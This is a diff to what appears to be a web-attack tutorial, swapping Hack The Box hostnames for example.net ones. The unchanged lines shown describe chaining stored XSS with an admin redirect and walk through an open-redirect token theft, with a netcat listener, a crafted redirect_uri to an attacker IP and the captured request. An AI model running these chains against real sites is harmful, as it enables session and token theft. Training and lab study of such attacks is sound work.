@@ -190,9 +190,9 @@ Provider sends user to `http://target/oauth/callback?next=http://attacker.com/&c
 
 Variants exist for every step of the OAuth chain. See OAuth-specific writeups for the full taxonomy.
 
-### Scenario: HTB-style submit-solution endpoint
+### Scenario: typical submit-solution endpoint
 
-The HTB-style scenario: a `/submit-solution?url=...` endpoint that, when an admin "submits a solution," redirects the admin's browser to the provided URL. Combined with a stored-XSS profile, you can:
+The typical scenario: a `/submit-solution?url=...` endpoint that, when an admin "submits a solution," redirects the admin's browser to the provided URL. Combined with a stored-XSS profile, you can:
 
 1. Plant XSS in your profile that doesn't fire on your own viewing (defenders won't notice)
 2. Submit a "solution" with `url=http://your-profile-with-XSS`
@@ -333,9 +333,9 @@ Bypass:
 
 ## Worked open-redirect chain
 
-The HTB scenario: `oredirect.htb.net` redirects after entering an email. The flow:
+A representative scenario: `oredirect.example.net` redirects after entering an email. The flow:
 
-1. Visit `http://oredirect.htb.net/?redirect_uri=/complete.html&token=ABC123`
+1. Visit `http://oredirect.example.net/?redirect_uri=/complete.html&token=ABC123`
 2. Enter email → POST to `/complete.html` with `token=ABC123` and form data
 3. After POST, server redirects to `redirect_uri` value
 
@@ -349,7 +349,7 @@ $ nc -lvnp 1337
 listening on [any] 1337 ...
 
 # 2. Set the redirect URI to attacker URL - craft this link:
-#    http://oredirect.htb.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
+#    http://oredirect.example.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
 
 # 3. Send to victim (or in test scenario, browse it yourself in a private window)
 #    Victim enters email, submits → POST → redirect chain
@@ -358,7 +358,7 @@ listening on [any] 1337 ...
 On the listener:
 
 ```
-connect to [YOUR-IP] from oredirect.htb.net 54322
+connect to [YOUR-IP] from oredirect.example.net 54322
 POST / HTTP/1.1
 Host: YOUR-IP:1337
 Content-Type: application/x-www-form-urlencoded
@@ -374,7 +374,7 @@ Even if the redirect is a GET (302), the token may still be in the URL or Refere
 
 ```
 GET /?token=ABC123 HTTP/1.1
-Referer: http://oredirect.htb.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
+Referer: http://oredirect.example.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
 ```
 
 Either way, the token is now in the attacker's logs.
